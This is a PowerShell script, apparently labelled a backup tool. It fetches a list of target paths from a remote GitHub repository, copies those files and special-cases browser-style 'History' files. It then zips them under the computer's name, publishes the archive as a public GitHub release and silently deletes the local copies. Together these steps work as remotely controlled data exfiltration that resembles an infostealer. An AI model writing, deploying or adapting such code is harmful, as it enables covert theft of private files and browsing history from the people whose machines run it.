# Set UTF-8 encoding
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# GitHub parameters
$token = $env:GITHUB_TOKEN
$repo = "drftghy/backup-files"

$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")

$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$zipName = "$computerName-upload-$timestamp.zip"
$zipPath = "$env:TEMP\$zipName"
$tempRoot = "$env:TEMP\${computerName}_upload-$timestamp"

New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# Remote path list from GitHub
$remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
try {
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
} catch {
    Write-Output "❌ 读取路径列表失败: $remoteTxtUrl"
    return
}

# Copy files to temp folder
$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"

    if (-not (Test-Path $path)) {
        Write-Output "⚠️ 路径不存在，跳过: $path"
        continue
    }

    $dest = Join-Path $tempRoot $name

    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
    } catch {
        Write-Output "⚠️ 拷贝失败: $path"
    }
}

# Create ZIP
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
    Write-Output "✅ 压缩成功: $zipPath"
} catch {
    Write-Output "❌ 压缩失败"
    return
}

# Create release on GitHub
$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Automated file upload on $date"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellUploader"
    Accept = "application/vnd.github.v3+json"
}

try {
    Write-Output "🛠 正在创建 Release..."
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
} catch {
    Write-Output "❌ 创建 Release 失败: $_"
    return
}

# Upload the file
try {
    Write-Output "📤 正在上传..."
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadResponse = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent"   = "PowerShellUploader"
    } -Body $fileBytes

    Write-Output "✅ 上传成功: $($uploadResponse.browser_download_url)"
} catch {
    Write-Output "❌ 上传失败: $_"
}

# Clean up
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
